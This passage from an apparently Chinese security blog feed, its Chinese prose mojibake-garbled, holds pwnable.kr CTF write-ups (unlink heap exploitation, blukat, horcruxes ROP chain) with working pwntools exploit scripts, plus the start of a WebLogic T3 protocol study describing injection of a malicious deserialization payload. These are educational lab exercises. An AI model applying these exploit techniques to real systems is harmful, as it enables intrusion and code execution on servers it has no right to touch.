src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15918589934469.jpg" alt="-w790"></p><p>Êàë‰ª¨Êó†Ê≥ïÁõ¥Êé•ÊéßÂà∂ eipÔºåÈÇ£‰πàËÉΩÂê¶ÈÄöËøáÊéßÂà∂ ebp -&gt; ecx -&gt; esp -&gt; eip ÂÆûÁé∞Âë¢</p><p>Êàë‰ª¨È¶ñÂÖàÂÖ≥Ê≥®Âà∞ unlink</p><pre class=" language-c"><code class="language-c">BK<span class="token operator">=</span>P<span class="token operator">-></span>bk<span class="token punctuation">;</span>FD<span class="token operator">=</span>P<span class="token operator">-></span>fd<span class="token punctuation">;</span>FD<span class="token operator">-></span>bk<span class="token operator">=</span>BK<span class="token punctuation">;</span>BK<span class="token operator">-></span>fd<span class="token operator">=</span>FD<span class="token punctuation">;</span></code></pre><p>Â¶Ç‰∏ãÔºö</p><pre class=" language-plain"><code class="language-plain">BK = *(P + 4)FD = *(P)FD -> bk = BK -> *(*(P)+4) = *(P + 4)BK -> fd = FD -> *(*(P+4)) = *(P)</code></pre><p>Êõ¥Áõ¥ÁôΩÁöÑËØ¥</p><pre class=" language-plain"><code class="language-plain">*(*(P->fd) + 4) = *(P->bk) Â∞Ü fd ÁöÑÂÄº +4 ‰Ωú‰∏∫Âú∞ÂùÄÔºåÂÖ∂ÂÄº‰∏∫ bk ÁöÑÂÄº*(*(P->bk)) = *(P->fd) Â∞Ü bk ÁöÑÂÄº‰Ωú‰∏∫Âú∞ÂùÄÔºåÂÖ∂ÂÄº‰∏∫ fd ÁöÑÂÄº</code></pre><p>Âç≥Êàë‰ª¨ÈÄöËøáÊéßÂà∂ fd bk ÂèØ‰ª•Ëé∑ÂèñÂà∞‰∏§Ê¨°ÂÜôÂÜÖÂ≠òÁöÑÊú∫‰ºö</p><ol><li>Âà©Áî® BK -&gt; fd = FDÔºåbk ÊéßÂà∂Âú∞ÂùÄÔºåfd ÊéßÂà∂ÂÄº</li><li>Âà©Áî® FD -&gt; bk = BKÔºåfd ÊéßÂà∂Âú∞ÂùÄÔºåbk ÊéßÂà∂ÂÄº</li></ol><p>ÂÖ∂Ê¨°ÊääÂ∑≤Áü•Êù°‰ª∂ÂàóÂá∫Êù•</p><ul><li>eip = [esp]</li><li>esp = ecx - 0x4</li><li>ecx = [ebp - 0x4]</li></ul><p>ÂÜçÊ†πÊçÆÊ†à‰∏≠ÂÜÖÂÆπÔºåÂèØÂæó</p><ul><li>stack_A + 0x10 = ebp - 0x4</li></ul><p>Áî±‰∫éÊàë‰ª¨ÂèØ‰ª•ÈÄöËøá A-&gt;buf ËøõË°å overflowÔºåÂÅáËÆæÊàë‰ª¨Â∞Üfunc_shellÊîæÂú®bufÂâç4‰∏™Â≠óËäÇÔºåÂêåÊó∂Êàë‰ª¨ÊääbufÂú∞ÂùÄÊ†áËÆ∞‰∏∫ shellcodeÔºåÈÇ£‰πàÂ∞±Êúâ</p><ul><li>[heap_A + 0x8] = [shellcode] = func_shell = eip</li><li>shellcode = esp = ecx - 0x4 =&gt; heap_A + 0x8 = ecx - 0x4</li></ul><p>Êàë‰ª¨ÁöÑÁõÆÊ†áÊòØÈÄöËøáÊéßÂà∂ fd bk ËøõËÄåÊéßÂà∂Ê†àÂÜÖÂ≠òÂÇ®ÁöÑ ecxÔºåËøõËÄåÊéßÂà∂ esp eipÔºåÊàë‰ª¨ÂÖàÈÄâÂèñ<code>bk Âú∞ÂùÄ fd ÂÄº</code>ÁöÑÂà©Áî®ÊñπÂºèÂç≥<code>BK-&gt;fd=FD</code>ÔºåÊúâ</p><ul><li>[bk] = &amp;ecx</li><li>[fd] = ecx</li></ul><p>ÁªìÂêà‰∏äÈù¢ÁöÑÊù°‰ª∂ÔºåÊé®Âæó</p><ul><li>[bk] = ebp - 0x4 = stack_A + 0x10</li><li>[fd] = heap_A + 0xc</li></ul><p>‰ª•Ê≠§ËÆæÁΩÆÂ∏ÉÂ±ÄÂ¶Ç‰∏ãÔºö</p><pre class=" language-plain"><code class="language-plain">0                 4                 8+-----------------+-----------------+ heapA|        fd       |        bk       |+-----------------+-----------------+ A -> buf|   *func_shell   |    ~padding~    |+-----------------+-----------------+ heapB-header|             ~padding~             |+-----------------+-----------------+ heapB|   heap_A + 0xc  |  stack_A + 0x10 |+-----------------+-----------------+ </code></pre><hr><p>ÂÅáÂ¶ÇÊàë‰ª¨ÈÄâÊã©<code>fd Âú∞ÂùÄ bk ÂÄº</code>ÁöÑÊñπÂºè<code>FD-&gt;bk=BK</code>ÔºåÊúâ</p><ul><li>[bk] = ecx</li><li>[fd] + 0x4 = &amp;ecx</li></ul><p>Êé®Âæó</p><ul><li>[bk] = heap_A + 0xc</li><li>[fd] = ebp - 0x4 - 0x4 = stack_A + 0x10 - 0x4 = stack_A + 0xc</li></ul><pre class=" language-plain"><code class="language-plain">0                 4                 8+-----------------+-----------------+ heapA|        fd       |        bk       |+-----------------+-----------------+ A -> buf|   *func_shell   |    ~padding~    |+-----------------+-----------------+ heapB-header|             ~padding~             |+-----------------+-----------------+ heapB|  stack_A + 0xc  |   heap_A + 0xc  |+-----------------+-----------------+ </code></pre><h3 id="Ëß£È¢ò-18"><a href="#Ëß£È¢ò-18" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><p>ÂÅöÂÆåÈ¢òÂêéÂÜçÊÉ≥‰∫ÜÂá†ÈÅçÊûÑÈÄ†ÂéüÁêÜÔºåÊÑüËßâÈÄöÈÄè‰∫Ü‰∏çÂ∞ë</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'info'</span>is_remote <span class="token operator">=</span> <span class="token boolean">True</span>method <span class="token operator">=</span> <span class="token number">2</span> <span class="token comment" spellcheck="true"># 1 or 2</span><span class="token keyword">if</span> is_remote<span class="token punctuation">:</span>    s <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'unlink'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'guest'</span><span class="token punctuation">)</span>    p <span class="token operator">=</span> s<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">"/home/unlink/unlink"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/pwn/Desktop/unlink"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"here is stack address leak: "</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"here is heap address leak: "</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"get shell!\n"</span><span class="token punctuation">)</span>shell_addr <span class="token operator">=</span> <span class="token number">0x080484eb</span><span class="token keyword">if</span> method <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    fd <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0xc</span>    bk <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token keyword">else</span><span class="token punctuation">:</span>    fd <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0xc</span>    bk <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0xc</span>payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">"."</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>fd<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bk<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="20-blukat"><a href="#20-blukat" class="headerlink" title="20. blukat"></a>20. blukat</h2><h3 id="È¢òÁõÆ-19"><a href="#È¢òÁõÆ-19" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> password<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span><span class="token operator">*</span> key <span class="token operator">=</span> <span class="token string">"3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+"</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">calc_flag</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> s<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/home/blukat/password"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fgets</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"guess the password!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"congrats! here is your flag: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">calc_flag</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wrong guess!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-19"><a href="#ÂàÜÊûê-19" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>‚Ä¶ËÑëÊ¥ûÈ¢òÔºåpassword‰∏∫<code>cat: password: Permission denied</code>ÔºåÂ∞±ÊòØ‰∏∫‰∫ÜÊèêÈÜíÊ≥®ÊÑèÊñá‰ª∂ÊùÉÈôê</p><h3 id="Ëß£È¢ò-19"><a href="#Ëß£È¢ò-19" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>s <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'blukat'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'guest'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> s<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">"/home/blukat/blukat"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"guess the password!\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"cat: password: Permission denied"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="21-horcruxes"><a href="#21-horcruxes" class="headerlink" title="21. horcruxes"></a>21. horcruxes</h2><h3 id="È¢òÁõÆ-20"><a href="#È¢òÁõÆ-20" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><p>ÈúÄË¶Å<code>sudo apt install libseccomp-dev:i386</code></p><h3 id="ÂàÜÊûê-20"><a href="#ÂàÜÊûê-20" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>Êúâ‰∏™Âêç‰∏∫ ropme ÁöÑÂáΩÊï∞Ôºå‰∏ªË¶ÅÂÖ≥Ê≥®ËøôÈáåÔºåÂÖ∂ÂäüËÉΩÂà§Êñ≠ËæìÂÖ•ÂÄºÊòØÂê¶‰∏∫ sumÔºåÊòØÁöÑËØùÂàôËøîÂõû flag<br>ÂèØ‰ª•ÊòéÊòæÁúãÂà∞Êï∞ÁªÑ<code>s</code>ÊúâÊ∫¢Âá∫Ôºå‰ΩÜÊòØÊÄé‰πàÂà©Áî®Âë¢Ôºü</p><ol><li>Áõ¥Êé•ÊéßÂà∂ ropme ËøîÂõûÂú∞ÂùÄÂà∞ open flag ÁöÑÂú∞ÂùÄ</li><li>Ëé∑Âèñ a~g ÁöÑÂèòÈáèÂÄºÈÄöËøá sum È™åËØÅ</li></ol><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921305968734.jpg" alt="-w469"></p><p>È¶ñÂÖàÊ£ÄÊü•ÁúãÂà∞ÊòØÊ≤°ÊúâÂºÄÂêØ ASLR Âú∞ÂùÄÊòØÂõ∫ÂÆöÂà©Áî®ÁöÑÔºåÊé•ÁùÄÂæÄ‰∏ãËµ∞</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921446659641.jpg" alt="-w307"></p><p>Á¨¨‰∏ÄÁßçÊñπÊ≥ï‰∏≠ÔºåÁî±‰∫éË∑≥ËΩ¨Âú∞ÂùÄÂê´Êúâ<code>0x0a</code>ÂØºËá¥Êó†Ê≥ïÊúâÊïà‰ªé gets ËæìÂÖ•ÔºåÊâÄ‰ª•Âè™ËÉΩËÄÉËôëÁ¨¨‰∫åÁßçÊñπÊ≥ï</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921431564969.jpg" alt="-w469"></p><p>Êàë‰ª¨ÁúãÂà∞ A~G ÂáΩÊï∞ÈÉΩÊòØÊó†ÂèÇÂáΩÊï∞Ôºå‰∏îÊâßË°å printf Âêé ret ËøîÂõûÔºåÊâÄ‰ª•Âú®Ê†à‰∏äË°®Áé∞‰∏∫ËøîÂõûÊâßË°åÂéüÂáΩÊï∞‰∏ã‰∏ÄÂú∞ÂùÄÊåá‰ª§</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921433549736.jpg" alt="-w474"></p><p>Êàë‰ª¨ÈÄöËøáÊääÊ†àË¶ÜÁõñÂ¶Ç‰∏ãÔºåÂΩìËæìÂÖ•‰∏çÁ≠â‰∫é sum Êó∂Ôºåropme Âç≥‰ºöË∑≥ËΩ¨Ë∞ÉÁî® A ÂáΩÊï∞ËæìÂá∫ aÔºåÂΩì‰ªé A ÂáΩÊï∞ËøîÂõûÊó∂‰æø‰ºöË∞ÉÁî® B ÂáΩÊï∞‚Ä¶‚Ä¶ÂΩì A~G ÈÉΩÊâßË°åÂÆåÊØïÂêéËÆ°ÁÆó sum ÂÄºÔºåÂÜçÊ¨°Ë∞ÉÂõû ropme ËæìÂÖ•Ê≠£Á°ÆÁ≠îÊ°àÂç≥ÂèØ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921442969783.jpg" alt="-w304"></p><h3 id="Ëß£È¢ò-20"><a href="#Ëß£È¢ò-20" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>is_remote <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> is_remote<span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">9032</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/pwn/Desktop/horcruxes"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> b<span class="token string">'.'</span> <span class="token operator">*</span> <span class="token number">0x78</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fe4b</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># A</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fe6a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># B</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fe89</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># C</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fea8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># D</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fec7</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># E</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fee6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># F</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809ff05</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># G</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fffc</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ropme</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Select Menu:"</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"How many EXP did you earned? : "</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>sum <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    msg <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> int<span class="token punctuation">(</span>msg<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">')\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    sum <span class="token operator">+=</span> nump<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Select Menu:"</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"How many EXP did you earned? : "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="ÂèÇËÄÉ"><a href="#ÂèÇËÄÉ" class="headerlink" title="ÂèÇËÄÉ"></a>ÂèÇËÄÉ</h2><ol><li><a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener">LINUX SYSTEM CALL TABLE FOR X86 64</a></li><li><a href="https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">linuxÁ®ãÂ∫èÁöÑÂ∏∏Áî®‰øùÊä§Êú∫Âà∂</a></li><li><a href="http://0x4c43.cn/2017/1024/linux-memory-management-and-heap/" target="_blank" rel="noopener">Linux ÂÜÖÂ≠òÁÆ°ÁêÜ‰∏éÂ†Ü</a></li><li><a href="https://segmentfault.com/a/1190000005118060" target="_blank" rel="noopener">LinuxÂ†ÜÂÜÖÂ≠òÁÆ°ÁêÜÊ∑±ÂÖ•ÂàÜÊûêÔºà‰∏äÔºâ</a></li><li><a href="https://segmentfault.com/a/1190000005183474" target="_blank" rel="noopener">LinuxÂ†ÜÂÜÖÂ≠òÁÆ°ÁêÜÊ∑±ÂÖ•ÂàÜÊûêÔºà‰∏ãÔºâ</a></li><li><a href="https://wiki.x10sec.org/pwn/heap/heap_implementation_details/" target="_blank" rel="noopener">Ê∑±ÂÖ•ÁêÜËß£Â†ÜÁöÑÂÆûÁé∞</a></li><li><a href="https://www.bilibili.com/video/av200358962/" target="_blank" rel="noopener">‰ªéÊ†àÊ∫¢Âá∫ÂºÄÂßãÔºåÊïô‰Ω†ÂÜôShellcodeÂíåROPÈìæ</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Â•Ω‰πÖÊ≤°Êõ¥Êñ∞ÔºåËèúÈ∏°Â≠¶ pwn&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pwn" scheme="https://blog.sari3l.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic T3 ÂçèËÆÆÂ≠¶‰π†</title>
    <link href="https://blog.sari3l.com/posts/ecb4dfa2/"/>
    <id>https://blog.sari3l.com/posts/ecb4dfa2/</id>
    <published>2020-04-01T08:16:44.000Z</published>
    <updated>2020-07-06T09:45:06.127Z</updated>
    
    <content type="html"><![CDATA[<h2 id="How-to-Implement-WebLogic-RMI"><a href="#How-to-Implement-WebLogic-RMI" class="headerlink" title="How to Implement WebLogic RMI"></a>How to Implement WebLogic RMI</h2><p>È¶ñÂÖàÊûÑÈÄ† rmi ÊúçÂä°Á´ØÔºå‰ª•‰æøËßÇÂØüÊï∞ÊçÆÂåÖ</p><p>Ê†πÊçÆ<a href="https://docs.oracle.com/middleware/1213/wls/WLRMI/rmi_imp.htm#WLRMI146" target="_blank" rel="noopener">ÂÆòÊñπÊñáÊ°£</a>ÔºåÁõ¥Êé•ÁîüÊàê jar ÂåÖ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15852292974954.jpg" alt="-w775"></p><p>Â∞ÜÁîüÊàêÁöÑjarÂåÖÊîæÂà∞ÊµãËØïdomainÁöÑlibÁõÆÂΩï‰∏ã</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15852293246061.jpg" alt="-w752"></p><p>Â∞ÜÁõÆÊ†á<code>server</code>Á±ªÈÖçÁΩÆ‰∏∫ÂêØÂä®Á±ª</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15852293730424.jpg" alt="-w988"></p><p>ÈáçÂêØ weblogic ÂêéÂç≥ÂèØËøõË°åË∞ÉÁî®</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15852294460930.jpg" alt="-w666"></p><h2 id="ÊµÅÈáèËß£Êûê"><a href="#ÊµÅÈáèËß£Êûê" class="headerlink" title="ÊµÅÈáèËß£Êûê"></a>ÊµÅÈáèËß£Êûê</h2><p>Á∫¢Ëâ≤ÈÉ®ÂàÜ‰∏∫ request<br>ËìùËâ≤ÈÉ®ÂàÜ‰∏∫ response</p><p>P.S. Ê≠§ËäÇÂΩìÊó∂Áî®‰∫Ü12.1.3.0.0ÁâàÊú¨ÔºåÊú¨ÊñáÂÖ∂‰ªñÂÜÖÂÆπÂùá‰∏∫12.2.1.4.0ÁâàÊú¨</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15852305401102.jpg" alt="-w1120"></p><p>ÈÄöËøá<code>ac ed 00 05</code>Á≠õÈÄâÂá∫ËØ∑Ê±ÇÂèçÂ∫èÂàóÂåñÈÉ®ÂàÜ‰æùÊ¨°‰∏∫</p><pre class=" language-plain"><code class="language-plain">weblogic.rjvm.ClassTableEntryweblogic.rjvm.ClassTableEntryweblogic.rjvm.ClassTableEntryweblogic.rjvm.JVMIDweblogic.rjvm.JVMID---weblogic.rjvm.ClassTableEntryweblogic.rjvm.ImmutableServiceContext---weblogic.rjvm.ImmutableServiceContext</code></pre><h2 id="T3-ÂçèËÆÆÂà©Áî®"><a href="#T3-ÂçèËÆÆÂà©Áî®" class="headerlink" title="T3 ÂçèËÆÆÂà©Áî®"></a>T3 ÂçèËÆÆÂà©Áî®</h2><p>Ê†πÊçÆÊï∞ÊçÆÂåÖËØ∑Ê±ÇÂÜÖÂÆπÔºåÊàë‰ª¨‰∏ª‰ΩìÈúÄË¶ÅÂàÜ‰∏∫‰∏§ÈÉ®ÂàÜËøõË°åÂèëÈÄÅ</p><ol><li><p>Êè°Êâãü§ù</p><pre class=" language-plain"><code class="language-plain"> t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://10.211.55.20:7001\nLP:DOMAIN\n\n</code></pre></li><li><p>Â∫èÂàóÂåñÊï∞ÊçÆ</p><p> ËøôÈáåÊ∂âÂèä‰∏§ÁßçÊñπÂºèÔºåÂÆûÈôÖ‰∏ä‰πüÁÆóÊòØÂêå‰∏ÄÁßç</p><ol><li><p>Â∞Ü‰∏äÈù¢ÊèêÂà∞ÁöÑÂ∫èÂàóÂåñÈÉ®ÂàÜÂÖ∂‰∏≠‰∏ÄÈ°πÊîπ‰∏∫ÊÅ∂ÊÑè payload</p></li><li><p>ÂèñÊ∂àÊâÄÊúâÂ∫èÂàóÂåñÈÉ®ÂàÜÔºåÂú®‰∏ãÈù¢Êï∞ÊçÆÂêéÁõ¥Êé•ÊãºÊé•ÊÅ∂ÊÑè payload</p><pre><code>000005fe016501ffffffffffffffff000000710000ea60000000184f0fb5416958bf21f2810099d59af6a410012655b1f4c837027973720078720178720278700000000c00000002000000000000000400000001007070707070700000000c00000002000000000000000400000001007006fe010000</code></pre><p> <img 